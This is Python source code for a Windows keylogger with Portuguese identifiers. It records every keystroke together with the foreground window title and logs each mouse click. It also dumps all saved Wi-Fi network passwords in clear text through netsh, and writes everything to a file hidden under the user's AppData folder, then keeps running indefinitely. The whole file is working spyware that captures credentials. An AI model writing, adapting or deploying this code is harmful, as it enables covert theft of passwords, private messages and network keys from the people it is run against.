from pynput import mouse
from pynput import keyboard
from screeninfo import get_monitors
import datetime
import time
import os
import win32gui
import subprocess

class KeyLogger():
    try:
        os.mkdir(os.getenv('APPDATA')+'/Logs')
    except:
        pass
    timeStamp = str(datetime.date.today()).replace('-','')
    def __init__(self, NomeDoArquivo: str = os.getenv('APPDATA')+'/Logs/'+timeStamp+'.txt') -> None:
        self.NomeDoArquivo = NomeDoArquivo
        self.j2 = ''

    @staticmethod
    def get_monitors(self):
        with open(self.NomeDoArquivo, 'a') as logs:
            for monitores in get_monitors():
                logs.write(str(monitores))

    def get_WiFi(self):
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']) 
        data = meta_data.decode('utf-8', errors ="backslashreplace")
        data = data.split('\n') 
        perfis = []
        with open(self.NomeDoArquivo, 'a') as logs:
            for i in data:
                if "All User Profile" in i :
                    i = i.split(":")
                    i = i[1]
                    i = i[1:-1]
                    perfis.append(i)
                if "Todos os Perfis" in i :
                    i = i.split(":")
                    i = i[1]
                    i = i[1:-1]
                    perfis.append(i)
            logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "Senha"))
            logs.write("\n----------------------------------------------")
            for perfil in perfis:
                try:
                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', perfil, 'key=clear'])
                    registros = registros.decode('utf-8', errors ="backslashreplace")
                    registros = registros.split('\n')
                    senha = [b.split(":")[1][1:-1] for b in registros if "Key Content" in b]
                    if senha == []:
                        senha = [b.split(":")[1][1:-1] for b in registros if "da Chave" in b]
                    try:
                        logs.write("\n{:<30}| {:<}".format(perfil, senha[0]))
                    except IndexError:
                        logs.write("\n{:<30}| {:<}".format(perfil, ""))
                except subprocess.CalledProcessError:
                    print('Erro')
            logs.write("\n----------------------------------------------\n")
        return

    def get_char(self,Tecla):
        try:
            if Tecla.char != None:
                return Tecla.char
            else:
                Tecla = str(Tecla)
                numero = ''
                numpad = {
                    '<96>': lambda numero: '0',
                    '<97>': lambda numero: '1',
                    '<98>': lambda numero: '2',
                    '<99>': lambda numero: '3',
                    '<100>': lambda numero: '4',
                    '<101>': lambda numero: '5',
                    '<102>': lambda numero: '6',
                    '<103>': lambda numero: '7',
                    '<104>': lambda numero: '8',
                    '<105>': lambda numero: '9'
                    }
                return numpad[Tecla](numero)
        except AttributeError:
            if str(Tecla) == 'Key.space':
                Tecla = str(Tecla).replace('Key.space',' ')
            if str(Tecla) == 'Key.enter':
                Tecla = str(Tecla).replace('Key.enter','\n')
            return str(Tecla)

    def on_press(self, Tecla):
        with open(self.NomeDoArquivo, 'a') as logs:
            logs.write(self.get_win_name())
            logs.write(self.get_char(Tecla))

    def on_click(self, x, y, botao, pressionado):
        if pressionado:
            with open(self.NomeDoArquivo, 'a') as logs:
                logs.write('\nClick registrado em ({0}, {1}) usando {2}\n'.format(x, y, botao))
            
    def get_win_name(self):
        janela = win32gui
        self.j1 = janela.GetWindowText(janela.GetForegroundWindow())
        if self.j1 != self.j2:
            self.j2 = self.j1
            return '\n+- '+self.j2+' -+\n'
        else:
            return ''

    def main(self):
        escuta1 = keyboard.Listener(
            on_press = self.on_press,
        )
        escuta2 = mouse.Listener(
            on_click = self.on_click,
        )
        escuta1.start()
        escuta2.start()
        self.get_monitors(self)
        self.get_WiFi()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    looper = 0
    while looper == 0:
        time.sleep(3600)